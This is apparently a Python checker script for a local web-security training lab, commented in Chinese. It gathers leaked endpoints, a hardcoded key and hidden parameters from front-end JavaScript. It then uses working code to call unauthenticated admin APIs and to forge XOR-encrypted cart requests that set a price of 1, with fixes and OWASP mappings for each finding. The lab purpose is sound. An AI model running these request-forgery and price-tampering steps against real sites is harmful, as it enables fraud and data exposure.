#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_frontendlab.py — 前端邏輯觀察驗證
=============================================================================

 這個驗證腳本的作法與先前所有靶場都不同：
   **它模擬「只讀前端 JavaScript」的攻擊者視角**——
   不讀後端程式碼，純粹從 app.js 的內容推導出可利用的線索，
   然後用那些線索實際呼叫 API。

 驗證流程（與真實滲透測試的資訊收集階段一致）：
     ① 取得 /static/app.js（前端原始碼）
     ② 靜態分析：找註解、硬編碼常數、端點、參數
     ③ 用找到的線索實際呼叫 API
     ④ 確認後端確實沒有防護

 ⚠ 僅在本機靶場執行；載荷皆為唯讀查詢，不修改任何狀態。
=============================================================================
"""

import base64
import json
import re
import sys
import urllib.error
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8920
BASE = "http://127.0.0.1:%d" % PORT
results = []


def req(path, method="GET", data=None):
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(BASE + path, method=method, data=body,
                               headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, owasp, passed, evidence):
    results.append((name, owasp, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, owasp))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" FrontendLab 驗證 — 前端邏輯觀察")
    print(" 目標：%s" % BASE)
    print("=" * 76)
    print(" 方法：只讀前端 JavaScript，不讀後端原始碼")
    print("=" * 76)

    st, _ = req("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        print("       請先啟動：python frontendlab.py %d" % PORT)
        sys.exit(1)

    # ================= 步驟①：取得前端原始碼 =================
    print("\n▶ 步驟 ①：取得 /static/app.js")
    st, js = req("/static/app.js")
    print("   HTTP %s，%d bytes" % (st, len(js)))
    if st != 200:
        print("   ✗ 無法取得前端原始碼")
        sys.exit(1)

    # ================= 步驟②：靜態分析 =================
    print("\n▶ 步驟 ②：靜態分析前端原始碼（模擬滲透測試的資訊收集）")

    # ---- J1：註解中的 API 路徑 ----
    comments = re.findall(r"//\s*(TODO|FIXME|NOTE)[:\s]*(.+)", js)
    leaked_paths = set()
    for _, text in comments:
        leaked_paths.update(re.findall(r"/api/[A-Za-z0-9_\-/]+", text))
    print("   找到註解 %d 條，洩漏的 API 路徑：%s"
          % (len(comments), ", ".join(sorted(leaked_paths)) or "無"))

    # ---- J2：硬編碼金鑰 ----
    m = re.search(r'ENC_KEY\s*=\s*"([^"]+)"', js)
    enc_key = m.group(1) if m else None
    print("   找到硬編碼金鑰：%s" % (enc_key if enc_key else "無"))

    # ---- J6：環境資訊 ----
    env_hits = {k: v for k, v in
                [("env", re.search(r'env:\s*"([^"]+)"', js)),
                 ("version", re.search(r'version:\s*"([^"]+)"', js)),
                 ("buildDate", re.search(r'buildDate:\s*"([^"]+)"', js))]
                if v}
    print("   找到環境資訊：%s"
          % ", ".join("%s=%s" % (k, v.group(1)) for k, v in env_hits.items()))

    # ---- J3：隱藏參數 ----
    hidden = []
    if "internal_cost" in js:
        hidden.append("internal_cost")
    if "hidden_discount" in js:
        hidden.append("hidden_discount")
    if re.search(r"allowPriceOverride", js):
        hidden.append("allowPriceOverride (feature flag)")
    print("   找到隱藏參數／旗標：%s" % ", ".join(hidden) or "無")

    # ================= 步驟③④：用線索實際攻擊 =================

    # ---------- J1 + J4：用註解洩漏的路徑打未授權 API ----------
    admin_path = "/api/admin/users" if "/api/admin/users" in leaked_paths \
        else (next((p for p in leaked_paths if "admin" in p), None))
    if admin_path:
        st, body = req(admin_path)
        ok = (st == 200) and ("FLAG{frontend_lab_hidden_admin_api}" in body)
        ev = [
            "資訊來源  : app.js 的註解「FIXME: admin 後台端點 %s 還沒有加權限檢查」" % admin_path,
            "請求      : GET %s（未攜帶任何憑證）" % admin_path,
            "預期漏洞  : 回傳 200 並洩漏使用者清單",
            "實際      : HTTP %s；取得 FLAG=%s" % (st, "FLAG{frontend_lab_hidden_admin_api}" in body),
            "根因      : (a) 前端註解洩漏了內部端點路徑",
            "            (b) 後端端點完全沒有授權檢查",
            "修補方向  : 移除前端敏感註解（建置時剝除）；",
            "            後端所有 admin 端點強制授權；前端隱藏 ≠ 安全",
            "OWASP 對照: A01（存取控制失效）+ CWE-540（原始碼含敏感資訊）",
        ]
        check("J1+J4 JS 註解洩漏路徑 + 未授權 admin API",
              "A01 / CWE-540 / CWE-862", ok, "\n".join(ev))
    else:
        check("J1+J4 JS 註解洩漏路徑 + 未授權 admin API", "-", False, "未在 JS 中找到 admin 路徑")

    # ---------- J2 + J6：debug 端點洩漏金鑰 ----------
    debug_path = next((p for p in leaked_paths if "debug" in p), None)
    if debug_path:
        st, body = req(debug_path)
        key_leaked = bool(enc_key and enc_key in body)
        ok = (st == 200) and key_leaked
        ev = [
            "資訊來源  : app.js 註解「NOTE: 測試環境的 debug 端點 %s」" % debug_path,
            "請求      : GET %s" % debug_path,
            "預期漏洞  : 端點未關閉，且洩漏前端金鑰（與 JS 中的常數相同）",
            "實際      : HTTP %s；金鑰洩漏=%s" % (st, key_leaked),
            "驗證方式  : 把 JS 中的 ENC_KEY 與端點回傳值比對（兩者一致即證實）",
            "            JS 的 ENC_KEY = %s" % enc_key,
            "根因      : 測試環境的 debug 端點在部署時未關閉",
            "修補方向  : 正式部署移除 debug 端點；以環境變數注入金鑰而非硬編碼；",
            "            用 feature flag 控管並在啟動時檢查環境",
            "OWASP 對照: A02（安全設定錯誤）+ CWE-489 / CWE-321",
        ]
        check("J2+J6 debug 端點洩漏硬編碼金鑰",
              "A02 / CWE-489 / CWE-321", ok, "\n".join(ev))

    # ---------- J3：隱藏參數 ----------
    st, body = req("/api/product?id=1&internal=1")
    ok = (st == 200) and ("FLAG{frontend_lab_hidden_parameter}" in body)
    ev = [
        "資訊來源  : app.js 的 PRODUCT_META 含 internal_cost / hidden_discount 欄位",
        "請求      : GET /api/product?id=1&internal=1",
        "預期漏洞  : UI 從未提供的 internal 參數，後端卻接受並回傳內部成本",
        "實際      : HTTP %s；取得 FLAG=%s" % (st, "FLAG{frontend_lab_hidden_parameter}" in body),
        "根因      : 前端 JS 洩漏了參數名稱；後端對隱藏參數沒有做輸入驗證",
        "危害      : 內部成本外洩 → 可推算利潤與定價策略",
        "修補方向  : 後端只回傳必要欄位（正面表列）；不要依賴「前端沒顯示」當防護",
        "OWASP 對照: CWE-472（Web 參數不可信）",
    ]
    check("J3 隱藏參數（internal_cost 外洩）",
          "CWE-472", ok, "\n".join(ev))

    # ---------- J5：前端加密可被逆向（自行偽造請求）----------
    if enc_key:
        # 用從 JS 找到的金鑰與演算法，自己產生「合法」的加密請求
        def encrypt(obj):
            plain = json.dumps(obj).encode("utf-8")
            kb = enc_key.encode("utf-8")
            out = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(plain))
            return base64.b64encode(out).decode()

        evil = {"product_id": 3, "qty": 1, "price": 1,        # ← 自行把價格改成 1
                "internal_cost": 1200, "discount_code": "STAFF90"}
        st, body = req("/api/cart/encrypted", "POST", {"data": encrypt(evil)})
        accepted = (st == 200) and ("\"price\": 1" in body)
        ev = [
            "資訊來源  : app.js 的 encryptPayload() 與 ENC_KEY",
            "做法      : 用 JS 中找到的金鑰與 XOR 演算法，自行加密任意內容",
            "請求      : POST /api/cart/encrypted（body 為自行產生的加密字串）",
            "送出內容  : product_id=3, qty=1, **price=1**（原價 5000）",
            "預期漏洞  : 後端接受自行偽造的「加密」請求",
            "實際      : HTTP %s；後端接受的價格=%s" % (st, accepted),
            "根因      : 前端加密使用對稱金鑰且金鑰就在前端",
            "            → 攻擊者可完全重現加密邏輯",
            "核心觀念  : **前端加密不是安全機制**，它只是增加閱讀難度",
            "修補方向  : 價格等敏感欄位一律由伺服器決定；",
            "            傳輸保護用 TLS；需要防竄改則用伺服器簽章（HMAC/非對稱）",
            "OWASP 對照: CWE-602（依賴客戶端強制執行）+ A04",
        ]
        check("J5 前端加密可被逆向（自行偽造請求）",
              "CWE-602 / A04", accepted, "\n".join(ev))
    else:
        check("J5 前端加密可被逆向", "-", False, "未取得金鑰")

    # ---------- 額外：未授權價格覆寫端點 ----------
    st, body = req("/api/admin/price", "POST",
                   {"product_id": 1, "price": 1})
    ok = (st == 200) and ("FLAG{frontend_lab_price_override}" in body)
    ev = [
        "資訊來源  : app.js 的 featureFlags.allowPriceOverride = true",
        "請求      : POST /api/admin/price  {product_id:1, price:1}",
        "預期漏洞  : 未授權即可覆寫商品價格",
        "實際      : HTTP %s；取得 FLAG=%s" % (st, "FLAG{frontend_lab_price_override}" in body),
        "根因      : 後端信任 feature flag 而沒有做角色檢查",
        "修補方向  : feature flag 不能取代授權；敏感操作必須驗證角色",
        "OWASP 對照: A01 / CWE-862",
    ]
    check("額外：未授權價格覆寫端點", "A01 / CWE-862", ok, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, owasp, passed, _ in results:
        print("  %-44s %-26s %s" % (name, owasp, "漏洞存在" if passed else "未觸發"))
    print("-" * 76)
    print("  共 %d/%d 個前端邏輯問題被驗證存在" % (found, len(results)))
    print()
    print("  這個腳本示範的流程，就是真實滲透測試的第一步：")
    print("    取得前端原始碼 → 靜態分析找線索 → 用線索驗證後端")
    print("  而本專案的後端靶場無法教這件事——因為那些弱點「只有前端才看得到」。")
    print("=" * 76)

    with open("frontendlab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "owasp": o, "present": p} for n, o, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 frontendlab_result.json）")


if __name__ == "__main__":
    main()
